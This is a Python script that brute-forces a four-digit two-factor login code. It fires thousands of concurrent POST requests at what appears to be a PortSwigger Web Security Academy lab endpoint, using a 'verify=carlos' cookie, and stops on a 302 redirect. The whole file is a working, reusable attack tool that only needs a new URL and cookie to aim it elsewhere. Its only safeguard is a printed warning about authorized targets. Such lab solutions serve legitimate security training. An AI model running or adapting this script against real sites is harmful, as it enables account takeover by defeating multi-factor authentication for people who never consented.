#!/usr/bin/env python3
import asyncio
import httpx
import time
from argparse import ArgumentParser
from pathlib import Path
from datetime import datetime, timezone

DEFAULT_URL = "https://0a7c003603c017278005e46b00bf0062.web-security-academy.net/login2"
DEFAULT_COOKIE_HEADER = "verify=carlos"
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": DEFAULT_URL,
}
DEFAULT_CONCURRENCY = 50      # jumlah simultaneous in-flight requests
DEFAULT_TIMEOUT = 10.0        # per-request timeout 
DEFAULT_START = 0
DEFAULT_END = 10000           # exclusive
DEFAULT_DELAY = 0.0           # optional per-request delay to be polite
LOGDIR = Path("./mfa_results")
# -----------------------------------------------------------------------

stop_event = asyncio.Event()
found = None  # tuple(code:int, status:int, timestamp:str)

def make_form(code_int: int):
    return {"mfa-code": f"{code_int:04d}"}

async def worker(name: int, queue: "asyncio.Queue[int]", client: httpx.AsyncClient,
                 timeout: float, delay: float, progress_interval: int):
    global found
    tries = 0
    last_report = time.time()
    while not queue.empty() and not stop_event.is_set():
        code = await queue.get()
        tries += 1
        try:
            # send POST; tidak follow redirects supaya bisa menampilkan 302
            r = await client.post(client.base_url, data=make_form(code), timeout=timeout, follow_redirects=False)
            status = r.status_code
            # succes condition jika 302 muncul
            if status == 302:
                found = (code, status, datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"))
                # save a small record
                LOGDIR.mkdir(parents=True, exist_ok=True)
                with open(LOGDIR / f"success_{code:04d}.txt", "w", encoding="utf-8") as fh:
                    fh.write(f"code={code:04d}\nstatus={status}\nheaders:\n{r.headers}\n")
                print(f"[WORKER {name}] SUCCESS -> code={code:04d} status={status}")
                stop_event.set()
                queue.task_done()
                return
        except Exception as e:
            # network/timeout: print occasionally but keep going
            now = time.time()
            if now - last_report > progress_interval:
                print(f"[WORKER {name}] exception for {code:04d}: {e}")
                last_report = now
        finally:
            queue.task_done()

        # optional small delay to reduce load per worker
        if delay:
            await asyncio.sleep(delay)

        # periodic progress heartbeat
        if tries % progress_interval == 0:
            print(f"[WORKER {name}] tried {tries} codes (last {code:04d})")

async def main_async(args):
    global found
    # Prepare queue of codes
    q = asyncio.Queue()
    for n in range(args.start, args.end):
        q.put_nowait(n)

    # Build headers and cookies
    headers = dict(DEFAULT_HEADERS)
    cookies = {}
    if args.cookie_header:
        # expects "name=value"
        if "=" in args.cookie_header:
            k, v = args.cookie_header.split("=", 1)
            cookies[k.strip()] = v.strip()
        else:
            # fallback: put whole string in Cookie header
            headers["Cookie"] = args.cookie_header

    # Use base_url so we can pass URL to client.post via relative path
    parsed = httpx.URL(args.url)
    base_url = f"{parsed.scheme}://{parsed.host}:{parsed.port or (443 if parsed.scheme=='https' else 80)}"
    # create AsyncClient with limits for concurrency & keepalive
    limits = httpx.Limits(max_keepalive_connections=args.concurrency, max_connections=args.concurrency)
    async with httpx.AsyncClient(base_url=args.url, headers=headers, cookies=cookies, limits=limits, verify=True) as client:
        # Note: client.base_url is args.url here; we will still call client.post(args.url,...)
        workers = [
            asyncio.create_task(worker(i+1, q, client, args.timeout, args.delay, args.progress_interval))
            for i in range(args.concurrency)
        ]
        start_t = time.time()
        await q.join()  # wait until queue is fully processed or a worker sets stop_event
        # if stopped early, cancel remaining tasks
        if stop_event.is_set():
            for w in workers:
                w.cancel()
        total_time = time.time() - start_t

    # Summary
    if found:
        code, status, ts = found
        print(f"[+] FOUND code={code:04d} status={status} at {ts} (elapsed {total_time:.2f}s)")
        print(f"[+] Result saved to {LOGDIR / f'success_{code:04d}.txt'}")
    else:
        print("[!] No 302 found in the given range.")

def parse_args():
    p = ArgumentParser()
    p.add_argument("--url", default=DEFAULT_URL, help="Full POST URL (endpoint).")
    p.add_argument("--cookie-header", default=DEFAULT_COOKIE_HEADER,
                   help='Cookie header string like "verify=carlos" (or "name=value").')
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Number of concurrent requests.")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Per-request timeout (s).")
    p.add_argument("--start", type=int, default=DEFAULT_START, help="Start code (inclusive).")
    p.add_argument("--end", type=int, default=DEFAULT_END, help="End code (exclusive).")
    p.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Optional delay per request per worker (s).")
    p.add_argument("--progress-interval", type=int, default=500, help="Worker progress heartbeat interval.")
    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()
    print("[*] WARNING: run only against authorized targets (e.g., PortSwigger labs).")
    print(f"[*] Target: {args.url}  Range: {args.start:04d}-{args.end-1:04d}  concurrency={args.concurrency}")
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("[!] Interrupted by user; exiting.")
